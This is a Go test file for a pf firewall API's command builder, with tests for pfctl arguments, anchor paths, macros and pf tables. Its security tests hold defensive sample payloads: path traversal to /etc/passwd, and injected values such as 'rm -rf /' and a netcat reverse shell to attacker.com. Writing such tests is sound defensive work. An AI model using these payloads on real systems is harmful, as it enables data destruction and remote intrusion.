package exec

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/rs/zerolog"
	"github.com/scd-systems/authpf-api/internal/authpf"
	"github.com/scd-systems/authpf-api/pkg/config"
	"github.com/stretchr/testify/assert"
)

// Helper function to create a test Exec instance
func createTestExec(t *testing.T, cfg *config.ConfigFile) *Exec {
	logger := zerolog.New(os.Stderr).With().Timestamp().Logger()
	db := authpf.New()
	nExec, err := New(logger, cfg, db)
	assert.NoError(t, err)
	return nExec
}

// Helper function to create a test config
func createTestConfig(t *testing.T, tmpDir string) *config.ConfigFile {
	return &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{
			PfctlBinary: "/sbin/pfctl",
		},
		Server: config.ConfigFileServer{
			ElevatorMode: "",
		},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
			FlushFilter:         []string{"nat", "queue", "ethernet", "rules", "states", "info", "Sources", "Reset"},
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{
				"testuser": {
					Password: "test",
					Role:     "user",
					UserID:   1000,
				},
			},
		},
	}
}

// TestBuildPfctlCmd tests pfctl command prefix building
func TestBuildPfctlCmd(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name           string
		elevatorMode   string
		pfctlBinary    string
		expectedPrefix string
	}{
		{
			name:           "default pfctl binary",
			elevatorMode:   "",
			pfctlBinary:    "/sbin/pfctl",
			expectedPrefix: "/sbin/pfctl",
		},
		{
			name:           "sudo elevator mode",
			elevatorMode:   "sudo",
			pfctlBinary:    "/sbin/pfctl",
			expectedPrefix: "sudo",
		},
		{
			name:           "doas elevator mode",
			elevatorMode:   "doas",
			pfctlBinary:    "/sbin/pfctl",
			expectedPrefix: "doas",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg.Server.ElevatorMode = tt.elevatorMode
			cfg.Defaults.PfctlBinary = tt.pfctlBinary

			exec := createTestExec(t, cfg)
			result := exec.buildPfctlCmd()

			if result != tt.expectedPrefix {
				t.Errorf("expected %q, got %q", tt.expectedPrefix, result)
			}
		})
	}
}

// TestBuildAuthPFAnchorPath tests path building with security checks
func TestBuildAuthPFAnchorPath(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name        string
		username    string
		expectError bool
		errorMsg    string
	}{
		{
			name:        "valid username",
			username:    "testuser",
			expectError: false,
		},
		{
			name:        "empty username",
			username:    "",
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "username with invalid characters",
			username:    "test@user",
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "username too long",
			username:    strings.Repeat("a", 256),
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "non-existent user",
			username:    "nonexistent",
			expectError: false, // Path building doesn't validate user existence
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := createTestExec(t, cfg)
			result, err := exec.buildAuthPFAnchorPath(tt.username)

			if tt.expectError {
				if err == nil && tt.username == "" {
					// Empty username should still produce a valid path
					if result == "" {
						t.Errorf("expected non-empty path for empty username")
					}
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
				if result == "" {
					t.Errorf("expected non-empty path")
				}
			}
		})
	}
}

// TestBuildAuthPFAnchorPathTraversal tests path traversal attack prevention
func TestBuildAuthPFAnchorPathTraversal(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name     string
		username string
	}{
		{
			name:     "path traversal with ../",
			username: "testuser/../../../etc/passwd",
		},
		{
			name:     "path traversal with absolute path",
			username: "/etc/passwd",
		},
		{
			name:     "path traversal with encoded ../",
			username: "testuser%2F..%2F..%2Fetc%2Fpasswd",
		},
		{
			name:     "path traversal with null byte",
			username: "testuser\x00../../../etc/passwd",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := createTestExec(t, cfg)
			result, err := exec.buildAuthPFAnchorPath(tt.username)

			// All path traversal attempts should fail validation
			if err == nil {
				t.Logf("path traversal check: result=%s", result)
				// Check if result is still within base directory
				absResult, _ := filepath.Abs(result)
				absBase, _ := filepath.Abs(tmpDir)
				if !strings.HasPrefix(absResult, absBase) {
					t.Errorf("path traversal not prevented: %s is outside base %s", absResult, absBase)
				}
			}

			if result != "" {
				absResult, _ := filepath.Abs(result)
				absBase, _ := filepath.Abs(tmpDir)
				if !strings.HasPrefix(absResult, absBase) {
					t.Errorf("path traversal detected: %s is outside base %s", absResult, absBase)
				}
			}
		})
	}
}

// TestBuildAuthPFAnchorPathSymlinkAttack tests symlink attack prevention
func TestBuildAuthPFAnchorPathSymlinkAttack(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	// Create a symlink pointing outside the base directory
	targetDir := t.TempDir()
	symlinkPath := filepath.Join(tmpDir, "testuser")
	err := os.Symlink(targetDir, symlinkPath)
	if err != nil {
		t.Skipf("cannot create symlink: %v", err)
	}

	exec := createTestExec(t, cfg)
	result, err := exec.buildAuthPFAnchorPath("testuser")

	// The path should be within the base directory after resolution
	if err != nil {
		t.Logf("symlink handling error: %v", err)
	}

	if result != "" {
		absResult, _ := filepath.Abs(result)
		absBase, _ := filepath.Abs(tmpDir)
		if !strings.HasPrefix(absResult, absBase) {
			t.Errorf("symlink attack: path %s is outside base %s", absResult, absBase)
		}
	}
}

// TestBuildAuthPFAnchorPathBoundaryCheck tests that paths are properly bounded
func TestBuildAuthPFAnchorPathBoundaryCheck(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	exec := createTestExec(t, cfg)
	result, err := exec.buildAuthPFAnchorPath("validuser")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	absResult, _ := filepath.Abs(result)
	absBase, _ := filepath.Abs(tmpDir)

	if !strings.HasPrefix(absResult, absBase) {
		t.Errorf("path %s is not within base directory %s", absResult, absBase)
	}
}

// TestBuildPfctlActivateCmdParameters tests pfctl command parameter building
func TestBuildPfctlActivateCmdParameters(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name           string
		rule           *authpf.AuthPFAnchor
		expectedParams int
	}{
		{
			name: "activate mode",
			rule: &authpf.AuthPFAnchor{
				Username: "testuser",
				UserIP:   "192.168.1.100",
				UserID:   1000,
			},
			expectedParams: 8, // -a anchor -D user_ip -D user_id -f rulePath
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := createTestExec(t, cfg)
			result := exec.buildPfctlActivateCmdParameters(tt.rule)

			if len(result) != tt.expectedParams {
				t.Errorf("expected %d parameters, got %d: %v", tt.expectedParams, len(result), result)
			}

			if len(result) > 0 && result[0] == "-a" {
				if len(result) > 1 && !strings.Contains(result[1], "authpf") {
					t.Errorf("expected anchor in parameters, got: %s", result[1])
				}
			}
		})
	}
}

// TestBuildPfctlCmdParametersCommandInjection tests command injection prevention
func TestBuildPfctlCmdParametersCommandInjection(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name     string
		username string
		userIP   string
		userID   int
	}{
		{
			name:     "command injection in username",
			username: "testuser; rm -rf /",
			userIP:   "192.168.1.100",
			userID:   1000,
		},
		{
			name:     "command injection in IP",
			username: "testuser",
			userIP:   "192.168.1.100; nc -e /bin/sh attacker.com 4444",
			userID:   1000,
		},
		{
			name:     "pipe injection",
			username: "testuser",
			userIP:   "192.168.1.100 | cat /etc/passwd",
			userID:   1000,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := &authpf.AuthPFAnchor{
				Username: tt.username,
				UserIP:   tt.userIP,
				UserID:   tt.userID,
			}

			exec := createTestExec(t, cfg)
			result := exec.buildPfctlActivateCmdParameters(rule)

			// Check that parameters don't contain shell metacharacters that could be interpreted
			for _, param := range result {
				if strings.Contains(param, ";") || strings.Contains(param, "|") || strings.Contains(param, "&") {
					// These should only appear in the rule file path, not in command parameters
					if !strings.HasPrefix(param, "/") {
						t.Logf("warning: potential injection in parameter: %s", param)
					}
				}
			}
		})
	}
}

// TestBuildPfctlDeactivateCmdParameters tests multi-command parameter building
func TestBuildPfctlDeactivateCmdParameters(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name          string
		expectedCount int
	}{
		{
			name:          "deactivate mode",
			expectedCount: 8, // nat, queue, ethernet, rules, states, info, Sources, Reset
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := &authpf.AuthPFAnchor{
				Username: "testuser",
				UserID:   1000,
			}

			exec := createTestExec(t, cfg)
			result := exec.buildPfctlDeactivateCmdParameters(rule)

			if len(result) != tt.expectedCount {
				t.Errorf("expected %d commands, got %d", tt.expectedCount, len(result))
			}
		})
	}
}

// TestBuildAuthPFAnchorPathWithSpecialCharacters tests handling of special characters
func TestBuildAuthPFAnchorPathWithSpecialCharacters(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name     string
		username string
		valid    bool
	}{
		{
			name:     "username with spaces",
			username: "test user",
			valid:    true,
		},
		{
			name:     "username with dots",
			username: "test.user",
			valid:    true,
		},
		{
			name:     "username with hyphens",
			username: "test-user",
			valid:    true,
		},
		{
			name:     "username with underscores",
			username: "test_user",
			valid:    true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := createTestExec(t, cfg)
			result, err := exec.buildAuthPFAnchorPath(tt.username)

			if tt.valid {
				if err != nil {
					t.Logf("error for valid username: %v", err)
				}
				if result != "" {
					absResult, _ := filepath.Abs(result)
					absBase, _ := filepath.Abs(tmpDir)
					if !strings.HasPrefix(absResult, absBase) {
						t.Errorf("path %s is outside base %s", absResult, absBase)
					}
				}
			}
		})
	}
}

// TestExecuteSystemCommandMocked tests command execution with mocking
func TestExecuteSystemCommandMocked(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)
	exec := createTestExec(t, cfg)

	// Test with a simple echo command
	result := exec.executeSystemCommand("echo", "test")

	assert.NotNil(t, result)
	assert.Equal(t, "echo", result.Command)
	assert.Contains(t, result.Stdout, "test")
	assert.Equal(t, 0, result.ExitCode)
}

// TestExecuteSystemCommandMockedError tests error handling
func TestExecuteSystemCommandMockedError(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)
	exec := createTestExec(t, cfg)

	// Test with a non-existent command
	result := exec.executeSystemCommand("/nonexistent/command")

	assert.NotNil(t, result)
	assert.Equal(t, "/nonexistent/command", result.Command)
	assert.Equal(t, -1, result.ExitCode)
	assert.NotNil(t, result.Error)
}

// TestBuildPfctlActivateCmdParameters_WithMacros tests that user macros are appended as -D key=value
func TestBuildPfctlActivateCmdParameters_WithMacros(t *testing.T) {
	tmpDir := t.TempDir()

	tests := []struct {
		name           string
		macros         map[string]string
		expectedParams int
		checkContains  []string
	}{
		{
			name:           "no macros",
			macros:         nil,
			expectedParams: 8, // -a anchor -D user_ip -D user_id -f rulePath
			checkContains:  []string{},
		},
		{
			name:           "empty macros map",
			macros:         map[string]string{},
			expectedParams: 8,
			checkContains:  []string{},
		},
		{
			name:           "one macro",
			macros:         map[string]string{"ext_if": "em0"},
			expectedParams: 10, // 8 base + 2 for -D ext_if=em0
			checkContains:  []string{"ext_if=em0"},
		},
		{
			name:           "macro with integer value",
			macros:         map[string]string{"max_conn": "100"},
			expectedParams: 10,
			checkContains:  []string{"max_conn=100"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &config.ConfigFile{
				Defaults: config.ConfigFileDefaults{PfctlBinary: "/sbin/pfctl"},
				AuthPF: config.ConfigFileAuthPF{
					UserRulesRootFolder: tmpDir,
					UserRulesFile:       "rules",
					AnchorName:          "authpf",
				},
				Rbac: config.ConfigFileRbac{
					Users: map[string]config.ConfigFileRbacUsers{
						"testuser": {UserID: 1000, Macros: tt.macros},
					},
				},
			}

			e := createTestExec(t, cfg)
			rule := &authpf.AuthPFAnchor{
				Username: "testuser",
				UserIP:   "192.168.1.1",
				UserID:   1000,
			}

			result := e.buildPfctlActivateCmdParameters(rule)

			assert.Equal(t, tt.expectedParams, len(result),
				"expected %d params, got %d: %v", tt.expectedParams, len(result), result)

			// Verify -f rulePath is always last
			if len(result) >= 2 {
				assert.Equal(t, "-f", result[len(result)-2], "second-to-last param must be -f")
			}

			// Verify all expected macro strings appear as -D values
			for _, expected := range tt.checkContains {
				found := false
				for i, p := range result {
					if p == "-D" && i+1 < len(result) && result[i+1] == expected {
						found = true
						break
					}
				}
				assert.True(t, found, "expected -D %s in params %v", expected, result)
			}
		})
	}
}

// TestBuildPfctlActivateCmdParameters_MultipleMacros tests ordering and completeness with multiple macros
func TestBuildPfctlActivateCmdParameters_MultipleMacros(t *testing.T) {
	tmpDir := t.TempDir()

	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/sbin/pfctl"},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{
				"testuser": {
					UserID: 1000,
					Macros: map[string]string{
						"ext_if":   "em0",
						"int_if":   "em1",
						"max_conn": "50",
					},
				},
			},
		},
	}

	e := createTestExec(t, cfg)
	rule := &authpf.AuthPFAnchor{
		Username: "testuser",
		UserIP:   "10.0.0.1",
		UserID:   1000,
	}

	result := e.buildPfctlActivateCmdParameters(rule)

	// 8 base params + 3 macros × 2 = 14
	assert.Equal(t, 14, len(result), "expected 14 params, got %d: %v", len(result), result)

	// -f rulePath must always be the last two elements
	assert.Equal(t, "-f", result[len(result)-2])

	// Count -D occurrences: 2 fixed (user_ip, user_id) + 3 macros = 5
	dCount := 0
	for _, p := range result {
		if p == "-D" {
			dCount++
		}
	}
	assert.Equal(t, 5, dCount, "expected 5 -D flags, got %d", dCount)
}

// TestBuildPfctlActivateCmdParameters_UnknownUser tests behaviour when user is not in RBAC config
func TestBuildPfctlActivateCmdParameters_UnknownUser(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir) // only "testuser" in config

	e := createTestExec(t, cfg)
	rule := &authpf.AuthPFAnchor{
		Username: "unknownuser",
		UserIP:   "10.0.0.2",
		UserID:   9999,
	}

	result := e.buildPfctlActivateCmdParameters(rule)

	// No macros for unknown user — base 8 params expected
	assert.Equal(t, 8, len(result), "expected 8 params for unknown user, got %d: %v", len(result), result)
}

// TestResolvePfTable_UserOverridesGlobal verifies that the user-level pfTable takes precedence over the global one
func TestResolvePfTable_UserOverridesGlobal(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/sbin/pfctl"},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
			PfTable:             "global_table",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{
				"testuser": {UserID: 1000, PfTable: "user_table"},
			},
		},
	}
	e := createTestExec(t, cfg)
	result := e.resolvePfTable("testuser")
	assert.Equal(t, "user_table", result, "user pfTable must override global pfTable")
}

// TestResolvePfTable_FallbackToGlobal verifies fallback to the global pfTable when the user has none configured
func TestResolvePfTable_FallbackToGlobal(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/sbin/pfctl"},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
			PfTable:             "global_table",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{
				"testuser": {UserID: 1000, PfTable: ""},
			},
		},
	}
	e := createTestExec(t, cfg)
	result := e.resolvePfTable("testuser")
	assert.Equal(t, "global_table", result, "should fall back to global pfTable when user pfTable is empty")
}

// TestResolvePfTable_EmptyWhenNoneConfigured verifies that an empty string is returned when no pfTable is configured anywhere
func TestResolvePfTable_EmptyWhenNoneConfigured(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir) // no pfTable configured
	e := createTestExec(t, cfg)
	result := e.resolvePfTable("testuser")
	assert.Equal(t, "", result, "should return empty string when no pfTable configured")
}

// TestResolvePfTable_UnknownUserFallsBackToGlobal verifies that an unknown user falls back to the global pfTable
func TestResolvePfTable_UnknownUserFallsBackToGlobal(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/sbin/pfctl"},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
			PfTable:             "global_table",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{},
		},
	}
	e := createTestExec(t, cfg)
	result := e.resolvePfTable("unknownuser")
	assert.Equal(t, "global_table", result, "unknown user should fall back to global pfTable")
}

// ─── AddIPToPfTable ───────────────────────────────────────────────────────────

// TestAddIPToPfTable_ReturnsNilWhenNoTableConfigured verifies that nil is returned when no pfTable is configured
func TestAddIPToPfTable_ReturnsNilWhenNoTableConfigured(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir) // no pfTable configured
	e := createTestExec(t, cfg)

	anchor := &authpf.AuthPFAnchor{
		Username: "testuser",
		UserIP:   "192.168.1.100",
		UserID:   1000,
	}

	result := e.AddIPToPfTable(anchor)
	assert.NotNil(t, result.ExitCode, 0)
}

// TestAddIPToPfTable_BuildsCorrectPfctlArgs verifies that the correct pfctl arguments are built
func TestAddIPToPfTable_BuildsCorrectPfctlArgs(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/sbin/pfctl"},
		Server:   config.ConfigFileServer{ElevatorMode: ""},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
			PfTable:             "authpf_users",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{
				"testuser": {UserID: 1000},
			},
		},
	}
	e := createTestExec(t, cfg)

	anchor := &authpf.AuthPFAnchor{
		Username: "testuser",
		UserIP:   "10.0.0.1",
		UserID:   1000,
	}

	result := e.AddIPToPfTable(anchor)
	// pfctl binary does not exist in the test environment, ExitCode != 0 is expected
	// Important: result must not be nil and args must be correctly assembled
	assert.NotNil(t, result, "result must not be nil when pfTable is configured")
	assert.Equal(t, "/sbin/pfctl", result.Command)
	assert.Contains(t, result.Args, "-t")
	assert.Contains(t, result.Args, "authpf_users")
	assert.Contains(t, result.Args, "-T")
	assert.Contains(t, result.Args, "add")
	assert.Contains(t, result.Args, "10.0.0.1")
}

// TestAddIPToPfTable_UsesUserTableOverGlobal verifies that the user-specific pfTable is used instead of the global one
func TestAddIPToPfTable_UsesUserTableOverGlobal(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/sbin/pfctl"},
		Server:   config.ConfigFileServer{ElevatorMode: ""},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
			PfTable:             "global_table",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{
				"testuser": {UserID: 1000, PfTable: "user_specific_table"},
			},
		},
	}
	e := createTestExec(t, cfg)

	anchor := &authpf.AuthPFAnchor{
		Username: "testuser",
		UserIP:   "10.0.0.1",
		UserID:   1000,
	}

	result := e.AddIPToPfTable(anchor)
	assert.NotNil(t, result)
	assert.Contains(t, result.Args, "user_specific_table",
		"must use user-specific pfTable, not global")
	assert.NotContains(t, result.Args, "global_table")
}

// TestRemoveIPFromPfTable_ReturnsNilWhenNoTableConfigured verifies that nil is returned when no pfTable is configured
func TestRemoveIPFromPfTable_ReturnsNilWhenNoTableConfigured(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir) // no pfTable configured
	e := createTestExec(t, cfg)

	anchor := &authpf.AuthPFAnchor{
		Username: "testuser",
		UserIP:   "192.168.1.100",
		UserID:   1000,
	}

	result := e.FlushPFTable(anchor)
	assert.Nil(t, result, "RemoveIPFromPfTable must return nil when no pfTable is configured")
}

// TestRemoveIPFromPfTable_BuildsCorrectPfctlArgs verifies that the correct pfctl arguments are built
func TestRemoveIPFromPfTable_BuildsCorrectPfctlArgs(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/sbin/pfctl"},
		Server:   config.ConfigFileServer{ElevatorMode: ""},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
			PfTable:             "authpf_users",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{
				"testuser": {UserID: 1000},
			},
		},
	}
	e := createTestExec(t, cfg)

	anchor := &authpf.AuthPFAnchor{
		Username: "testuser",
		UserIP:   "10.0.0.1",
		UserID:   1000,
	}

	result := e.removeIPFromPfTable(anchor)
	assert.NotNil(t, result, "result must not be nil when pfTable is configured")
	assert.Equal(t, "/sbin/pfctl", result.Command)
	assert.Contains(t, result.Args, "-t")
	assert.Contains(t, result.Args, "authpf_users")
	assert.Contains(t, result.Args, "-T")
	assert.Contains(t, result.Args, "delete") // must use "delete", not "add"
	assert.Contains(t, result.Args, "10.0.0.1")
}

// TestRemoveIPFromPfTable_UsesUserTableOverGlobal verifies that the user-specific pfTable takes precedence over the global one
func TestRemoveIPFromPfTable_UsesUserTableOverGlobal(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/sbin/pfctl"},
		Server:   config.ConfigFileServer{ElevatorMode: ""},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
			PfTable:             "global_table",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{
				"testuser": {UserID: 1000, PfTable: "user_specific_table"},
			},
		},
	}
	e := createTestExec(t, cfg)

	anchor := &authpf.AuthPFAnchor{
		Username: "testuser",
		UserIP:   "10.0.0.1",
		UserID:   1000,
	}

	result := e.removeIPFromPfTable(anchor)
	assert.NotNil(t, result)
	assert.Contains(t, result.Args, "user_specific_table")
	assert.NotContains(t, result.Args, "global_table")
}

// TestFlushAllPFTables_EmptyDB verifies that no panic occurs when the anchor DB is empty
func TestFlushAllPFTables_EmptyDB(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/sbin/pfctl"},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
			PfTable:             "authpf_users",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{},
		},
	}
	db := authpf.New() // empty DB
	logger := zerolog.New(os.Stderr)
	e, err := New(logger, cfg, db)
	assert.NoError(t, err)

	// must not panic
	assert.NotPanics(t, func() {
		e.FlushAllPFTables()
	}, "FlushAllPFTables must not panic on empty DB")
}

// TestFlushAllPFTables_NoTableConfigured verifies that no pfctl call is made when no pfTable is configured
func TestFlushAllPFTables_NoTableConfigured(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir) // no pfTable configured

	db := authpf.New()
	anchor, _ := authpf.SetAnchor("testuser", "30m", "10.0.0.1", 1000, time.Now().Add(30*time.Minute))
	db.Add(anchor)

	logger := zerolog.New(os.Stderr)
	e, err := New(logger, cfg, db)
	assert.NoError(t, err)

	// must not panic, no pfctl call expected
	assert.NotPanics(t, func() {
		e.FlushAllPFTables()
	}, "FlushAllPFTables must not panic when no pfTable configured")
}

// TestCheckPfTableExists_NonExistentBinary verifies that an error is returned when the pfctl binary does not exist
func TestCheckPfTableExists_NonExistentBinary(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/nonexistent/pfctl"},
		Server:   config.ConfigFileServer{ElevatorMode: ""},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{},
		},
	}
	e := createTestExec(t, cfg)

	err := e.CheckPfTableExists("some_table")
	assert.Error(t, err, "CheckPfTableExists must return error when pfctl binary does not exist")
	assert.Contains(t, err.Error(), "some_table")
}

// TestCheckPfTableExists_ErrorMessageContainsTableName verifies that the error message contains the table name for clear diagnostics
func TestCheckPfTableExists_ErrorMessageContainsTableName(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{PfctlBinary: "/nonexistent/pfctl"},
		Server:   config.ConfigFileServer{ElevatorMode: ""},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{},
		},
	}
	e := createTestExec(t, cfg)

	tableName := "my_custom_table"
	err := e.CheckPfTableExists(tableName)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), tableName,
		"error message must contain the table name for clear diagnostics")
}
